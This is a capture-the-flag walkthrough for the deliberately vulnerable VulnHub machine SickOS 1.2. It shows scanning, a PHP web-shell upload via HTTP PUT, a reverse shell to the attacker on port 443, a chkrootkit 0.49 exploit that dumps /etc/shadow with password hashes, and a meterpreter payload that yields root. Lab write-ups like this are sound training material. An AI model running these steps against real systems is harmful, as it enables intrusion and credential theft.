# SickOS 1.2 | VulnHub
https://www.vulnhub.com/entry/sickos-12,144/

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -T4 -p- 10.1.1.64
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-05 07:53 EST
Nmap scan report for ubuntu.lan (10.1.1.64)
Host is up (0.0012s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:60:FF:A8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.15 ms ubuntu.lan (10.1.1.64)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.42 seconds
```
The machine is running SSH and an Lighthttp web server.

### 2. Enumeration
The homepage for the web server is a Keanu meme with the text "What if computer viruses are really made by the anti-virus softare companies to make money?"
Dirbusting shows there is a test directory.
```bash
kali@kali:~$ gobuster dir -u http://10.1.1.64/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.1.1.64/
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/06 00:10:55 Starting gobuster
===============================================================
/test (Status: 301)
===============================================================
2020/11/06 00:11:39 Finished
===============================================================
```
The test directory is just an open index page with no files. I run Nikto against both the main and subdirectory.
```bash
kali@kali:~$ nikto -host http://10.1.1.64
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.1.1.64
+ Target Hostname:    10.1.1.64
+ Target Port:        80
+ Start Time:         2020-11-06 00:23:46 (GMT-5)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ 26519 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2020-11-06 00:34:18 (GMT-5) (632 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
This tells me the server is running PHP.

### 3. Get a shell
Firstly use PUT to upload a PHP backdoor into the test directory:
```bash
kali@kali:~/Desktop/osc/sickos$ curl -X PUT http://10.1.1.64/test/shell.php -F file=@shell.php
```
This gets me access as www-data, but I do want a better interactive shell for enumeration. Sadly my normal reverse shell payloads fail to connect back, so I decide to try and generate a weevely PHP shell and upload:
```bash
kali@kali:~/Desktop/osc/sickos$ weevely generate jack revshell.php
Generated 'revshell.php' with password 'jack' of 744 byte size.
kali@kali:~/Desktop/osc/sickos$ curl -X PUT http://10.1.1.64/test/revshell.php -F file=@revshell.php
```
Connect to the webshell.
```bash
kali@kali:~/Desktop/osc/sickos$ weevely http://10.1.1.64/test/revshell.php jack

[+] weevely 4.0.1

[+] Target:     10.1.1.64
[+] Session:    /home/kali/.weevely/sessions/10.1.1.64/revshell_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> whoami
www-data
```

### 4. Enumerate
Before moving on I start trying to figure out why my reverse shells are being blocked. If I operate on the idea that ports are blocked, I can try common ports such as 53, 443 etc and see if those connect. Note: To do this I need to restart weevely and run it as root.
```bash
weevely> :backdoor_reversetcp 10.1.1.74 53
^CModule 'backdoor_reversetcp' execution terminated (it hanged)
www-data@ubuntu:/var/www/test $ :backdoor_reversetcp 10.1.1.74 443
Reverse shell connected, insert commands. Append semi-colon help to get the commands accepted.
```
So 443 appears to allow connections through. Moving on to enumeration.
```
weevely> :system_info
+--------------------+------------------------------------------------------------------------------------------+
| document_root      | /var/www                                                                                 |
| whoami             | www-data                                                                                 |
| hostname           | ubuntu                                                                                   |
| pwd                | /tmp                                                                                     |
| open_basedir       |                                                                                          |
| safe_mode          | False                                                                                    |
| script             | /test/revshell.php                                                                       |
| script_folder      | /var/www/test                                                                            |
| uname              | Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 |
| os                 | Linux                                                                                    |
| client_ip          | 10.1.1.74                                                                                |
| max_execution_time | 30                                                                                       |
| php_self           | /test/revshell.php                                                                       |
| dir_sep            | /                                                                                        |
| php_version        | 5.3.10-1ubuntu3.21                                                                       |
+--------------------+------------------------------------------------------------------------------------------+
```
Nothing really to look at in the web folders.
```bash
www-data@ubuntu:/tmp $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```
Running processes:
```bash
www-data@ubuntu:/ $ :system_procs
UID        PID  PPID STIME TTY            TIME CMD
root         1     0 22:33 ?          00:00:44 /sbin/init
root        10     2 22:33 ?          00:00:42 [watchdog/0]
root        11     2 22:33 ?          00:00:42 [khelper]
root      1170     1 22:33 ?          00:00:41 /usr/sbin/vmware-vmblock-fuse -o subtype=vmware-vmblock,default_permissions,allow_other /var/run/vmblock-fuse 
root      1189     1 22:33 ?          00:00:41 /usr/sbin/vmtoolsd 
root        12     2 22:33 ?          00:00:42 [kdevtmpfs]
root      1216     1 22:34 ?          00:00:06 /usr/lib/vmware-vgauth/VGAuthService -s 
root        13     2 22:33 ?          00:00:42 [netns]
root        14     2 22:33 ?          00:00:42 [writeback]
root        15     2 22:33 ?          00:00:42 [kintegrityd]
root        16     2 22:33 ?          00:00:42 [bioset]
root        17     2 22:33 ?          00:00:42 [kworker/u17:0]
root        18     2 22:33 ?          00:00:42 [kblockd]
root        19     2 22:33 ?          00:00:42 [ata_sff]
root         2     0 22:33 ?          00:00:42 [kthreadd]
root        20     2 22:33 ?          00:00:42 [khubd]
root        21     2 22:33 ?          00:00:42 [md]
root       212     2 22:33 ?          00:00:42 [mpt_poll_0]
root       213     2 22:33 ?          00:00:42 [mpt/0]
root       214     2 22:33 ?          00:00:42 [scsi_eh_2]
root       215     2 22:33 ?          00:00:42 [scsi_eh_3]
root       217     2 22:33 ?          00:00:42 [scsi_eh_4]
root        22     2 22:33 ?          00:00:42 [devfreq_wq]
root       222     2 22:33 ?          00:00:42 [scsi_eh_5]
root       224     2 22:33 ?          00:00:42 [scsi_eh_6]
root       226     2 22:33 ?          00:00:42 [scsi_eh_7]
root       227     2 22:33 ?          00:00:42 [scsi_eh_8]
root       228     2 22:33 ?          00:00:42 [scsi_eh_9]
root       229     2 22:33 ?          00:00:42 [scsi_eh_10]
root        23     2 22:33 ?          00:00:42 [kworker/0:1]
root       232     2 22:33 ?          00:00:42 [scsi_eh_11]
root       233     2 22:33 ?          00:00:42 [scsi_eh_12]
root       234     2 22:33 ?          00:00:42 [scsi_eh_13]
root       235     2 22:33 ?          00:00:42 [scsi_eh_14]
root       236     2 22:33 ?          00:00:42 [scsi_eh_15]
root       237     2 22:33 ?          00:00:42 [scsi_eh_16]
root       238     2 22:33 ?          00:00:42 [scsi_eh_17]
root       239     2 22:33 ?          00:00:42 [scsi_eh_18]
root       240     2 22:33 ?          00:00:42 [scsi_eh_19]
root       241     2 22:33 ?          00:00:42 [scsi_eh_20]
root       242     2 22:33 ?          00:00:42 [scsi_eh_21]
root       243     2 22:33 ?          00:00:42 [scsi_eh_22]
root       244     2 22:33 ?          00:00:42 [scsi_eh_23]
root       245     2 22:33 ?          00:00:42 [scsi_eh_24]
root       246     2 22:33 ?          00:00:42 [scsi_eh_25]
root       247     2 22:33 ?          00:00:42 [scsi_eh_26]
root       248     2 22:33 ?          00:00:42 [scsi_eh_27]
root       249     2 22:33 ?          00:00:42 [scsi_eh_28]
root        25     2 22:33 ?          00:00:42 [khungtaskd]
root       250     2 22:33 ?          00:00:42 [scsi_eh_29]
root       251     2 22:33 ?          00:00:42 [scsi_eh_30]
root       252     2 22:33 ?          00:00:42 [scsi_eh_31]
root       253     2 22:33 ?          00:00:42 [kworker/u16:5]
root       254     2 22:33 ?          00:00:42 [kworker/u16:6]
root       255     2 22:33 ?          00:00:42 [kworker/u16:7]
root       256     2 22:33 ?          00:00:42 [kworker/u16:8]
root       257     2 22:33 ?          00:00:42 [kworker/u16:9]
root       258     2 22:33 ?          00:00:42 [kworker/u16:10]
root       259     2 22:33 ?          00:00:42 [kworker/u16:11]
root        26     2 22:33 ?          00:00:42 [kswapd0]
root       260     2 22:33 ?          00:00:42 [kworker/u16:12]
root       261     2 22:33 ?          00:00:42 [kworker/u16:13]
root       262     2 22:33 ?          00:00:42 [kworker/u16:14]
root       263     2 22:33 ?          00:00:42 [kworker/u16:15]
root       264     2 22:33 ?          00:00:42 [kworker/u16:16]
root       265     2 22:33 ?          00:00:42 [kworker/u16:17]
root       266     2 22:33 ?          00:00:42 [kworker/u16:18]
root       267     2 22:33 ?          00:00:42 [kworker/u16:19]
root       268     2 22:33 ?          00:00:42 [kworker/u16:20]
root       269     2 22:33 ?          00:00:42 [kworker/u16:21]
root        27     2 22:33 ?          00:00:42 [ksmd]
root       270     2 22:33 ?          00:00:42 [kworker/u16:22]
root       271     2 22:33 ?          00:00:42 [kworker/u16:23]
root       272     2 22:33 ?          00:00:42 [kworker/u16:24]
root       273     2 22:33 ?          00:00:42 [kworker/u16:25]
root       274     2 22:33 ?          00:00:42 [kworker/u16:26]
root       275     2 22:33 ?          00:00:42 [kworker/u16:27]
root       276     2 22:33 ?          00:00:42 [kworker/u16:28]
root       277     2 22:33 ?          00:00:42 [kworker/u16:29]
root       278     2 22:33 ?          00:00:42 [kworker/u16:30]
root       279     2 22:33 ?          00:00:42 [kworker/u16:31]
root        28     2 22:33 ?          00:00:42 [khugepaged]
root       280     2 22:33 ?          00:00:42 [scsi_eh_32]
root       282     2 22:33 ?          00:00:42 [kworker/u16:32]
root       283     2 22:33 ?          00:00:42 [kworker/u16:33]
root        29     2 22:33 ?          00:00:42 [fsnotify_mark]
root         3     2 22:33 ?          00:00:42 [ksoftirqd/0]
root        30     2 22:33 ?          00:00:42 [ecryptfs-kthrea]
root        31     2 22:33 ?          00:00:42 [crypto]
root       376     2 22:33 ?          00:00:42 [jbd2/sda1-8]
root       377     2 22:33 ?          00:00:42 [ext4-rsv-conver]
root       378     2 22:33 ?          00:00:42 [ext4-unrsv-conv]
root         4     2 22:33 ?          00:00:42 [kworker/0:0]
root        43     2 22:33 ?          00:00:42 [kthrotld]
root        44     2 22:33 ?          00:00:42 [kworker/u16:1]
root        45     2 22:33 ?          00:00:42 [scsi_eh_0]
root        46     2 22:33 ?          00:00:42 [scsi_eh_1]
root       465     1 22:33 ?          00:00:42 upstart-udev-bridge --daemon 
root       467     1 22:33 ?          00:00:46 /sbin/udevd --daemon 
root        47     2 22:33 ?          00:00:42 [kworker/u16:2]
root        48     2 22:33 ?          00:00:42 [kworker/u16:3]
root        49     2 22:33 ?          00:00:42 [dm_bufio_cache]
root         5     2 22:33 ?          00:00:42 [kworker/0:0H]
root        50     2 22:33 ?          00:00:42 [kworker/u16:4]
message+   565     1 22:33 ?          00:00:42 dbus-daemon --system --fork --activation=upstart 
syslog     569     1 22:33 ?          00:00:42 rsyslogd -c5 
root       586   467 22:33 ?          00:00:42 /sbin/udevd --daemon 
root       587   467 22:33 ?          00:00:42 /sbin/udevd --daemon 
root         6     2 22:33 ?          00:00:42 [kworker/u16:0]
root       604     2 22:33 ?          00:00:42 [ttm_swap]
root       650     2 22:33 ?          00:00:42 [kpsmoused]
root       683     2 22:33 ?          00:00:42 [kworker/0:2]
root        69     2 22:33 ?          00:00:42 [deferwq]
root         7     2 22:33 ?          00:00:42 [migration/0]
root        70     2 22:33 ?          00:00:42 [charger_manager]
root       748     1 22:33 ?          00:00:42 upstart-socket-bridge --daemon 
root       768     1 22:33 ?          00:00:42 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -1 eth0 
root       790     1 22:33 ?          00:00:42 /usr/sbin/sshd -D 
root         8     2 22:33 ?          00:00:42 [rcu_bh]
root       881     1 22:33 tty4       00:00:41 /sbin/getty -8 38400 tty4 
root       884     1 22:33 tty5       00:00:41 /sbin/getty -8 38400 tty5 
root       891     1 22:33 tty2       00:00:41 /sbin/getty -8 38400 tty2 
root       892     1 22:33 tty3       00:00:41 /sbin/getty -8 38400 tty3 
root       894     1 22:33 tty6       00:00:41 /sbin/getty -8 38400 tty6 
root         9     2 22:33 ?          00:00:42 [rcu_sched]
root       900     1 22:33 ?          00:00:41 cron 
root       901     1 22:33 ?          00:00:41 atd 
www-data   949     1 22:33 ?          00:00:41 /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf 
www-data   951   949 22:33 ?          00:00:41 /usr/bin/php-cgi 
www-data   962   951 22:33 ?          00:00:41 /usr/bin/php-cgi 
www-data   963   951 22:33 ?          00:00:41 /usr/bin/php-cgi 
www-data   964   951 22:33 ?          00:00:41 /usr/bin/php-cgi 
www-data   965   951 22:33 ?          00:00:41 /usr/bin/php-cgi 
root       974     1 22:33 ?          00:00:41 /bin/sh /etc/init.d/ondemand background 
root       976   974 22:33 ?          00:00:41 sleep 60 
root       986     1 22:33 tty1       00:00:41 /sbin/getty -8 38400 tty1 
```
File system audit:
```bash
www-data@ubuntu:/tmp $ :audit_filesystem

Search executable files in /home/ folder
/home/
/home/john
Search writable files in /home/ folder

Search certain readable files in etc folder
/etc/sudoers.d
/etc/bash_completion.d/shadow
/etc/apparmor.d/abstractions/ssl_keys

Search certain readable log files
/var/log/lastlog
/var/log/dpkg.log
/var/log/udev
/var/log/alternatives.log
/var/log/boot.log
/var/log/wtmp

Search writable files in /var/spool/cron/ folder

Search writable files in binary folders
/lib/init/rw/lighttpd
/lib/init/rw/shm
/lib/init/rw/lock
/lib/init/rw/vmware/guestServicePipe
/lib/init/rw/lighttpd/lighttpd.webdav_lock.db
/lib/init/rw/dbus/system_bus_socket
Search writable files in etc folder
Search writable files in / folder
/tmp
```
Cron jobs:
```bash
www-data@ubuntu:/ $ ls /etc/cron*
/etc/crontab

ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
apt
aptitude
bsdmainutils
chkrootkit
dpkg
lighttpd
logrotate
man-db
mlocate
passwd
popularity-contest
standard

/etc/cron.hourly:

/etc/cron.monthly:

/etc/cron.weekly:
apt-xapian-index
man-db

www-data@ubuntu:/ $ ls -la /etc/cron.daily/
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Nov  5 22:33 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```
None of the cron jobs in here are editable, but I can read them anyway. Most of them are basic ones that are found in many Linux versions. Chkrootkit is not usually seen though. We can take a closer look and get the version number.
```bash
www-data@ubuntu:/ $ chkrootkit -V
chkrootkit version 0.49
```
This version is vulnerable to a privilege escalation exploit that will allow a user to execute commands as root, but creating a file called "update" in the /tmp directory.

### 5. Escalate to root
First thing I'll try is grabbing the shadow file.
```bash
www-data@ubuntu:/tmp $ :file_upload ./update /tmp/update
True

www-data@ubuntu:/tmp $ chmod +x update
www-data@ubuntu:/tmp $ cat update
#!/bin/sh
cat /etc/shadow > /tmp/shadow
chmod 777 /tmp/shadow

www-data@ubuntu:/tmp $ ls
VMwareDnD
php.socket-0
shadow
update
vgauthsvclog.txt.0
vmware-root

www-data@ubuntu:/tmp $ cat shadow
root:$6$DT8ti3eq$pMlNEf0pGecTc.37FsJQBG17YioEa8X1Nmq63Qqnx66b8L/EYsz3sBtyRhoDnGu4uEOA.SCcagQm9Kcrea7Nt.:16917:0:99999:7:::
daemon:*:16890:0:99999:7:::
bin:*:16890:0:99999:7:::
sys:*:16890:0:99999:7:::
sync:*:16890:0:99999:7:::
games:*:16890:0:99999:7:::
man:*:16890:0:99999:7:::
lp:*:16890:0:99999:7:::
mail:*:16890:0:99999:7:::
news:*:16890:0:99999:7:::
uucp:*:16890:0:99999:7:::
proxy:*:16890:0:99999:7:::
www-data:*:16890:0:99999:7:::
backup:*:16890:0:99999:7:::
list:*:16890:0:99999:7:::
irc:*:16890:0:99999:7:::
gnats:*:16890:0:99999:7:::
nobody:*:16890:0:99999:7:::
libuuid:!:16890:0:99999:7:::
syslog:*:16890:0:99999:7:::
messagebus:*:16890:0:99999:7:::
john:$6$6rHHymgb$11NJYyJJGRU7KW006odutnwRICmL.al76o4DIyjilr50XSUOpFQdhRHv29Zrv9XEWqAp8ah4wJv.nkgAYBNmT/:16917:0:99999:7:::
sshd:*:16903:0:99999:7:::
                                         
www-data@ubuntu:/tmp $ :file_download /tmp/shadow shadow
```
Unfortunately the hash won't crack. Must be a decent password. Ok then, onto plan B. Generate a meterpreter payload.
```bash
kali@kali:~/Desktop/osc/sickos$ msfvenom --arch x86 --platform linux -p linux/x86/meterpreter_reverse_tcp LHOST=10.1.1.74 LPORT=443 -f elf > update
No encoder specified, outputting raw payload
Payload size: 1102196 bytes
Final size of elf file: 1102196 bytes
```
Put it on the machine.
```bash
www-data@ubuntu:/tmp $ :file_upload ./update /tmp/update
True
www-data@ubuntu:/tmp $ chmod +x update
```
Wait for the session.
```bash
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.1.1.74:443 
[*] Meterpreter session 1 opened (10.1.1.74:443 -> 10.1.1.64:36704) at 2020-11-06 02:40:00 -0500

meterpreter > shell
Process 19584 created.
Channel 1 created.
whoami
root
```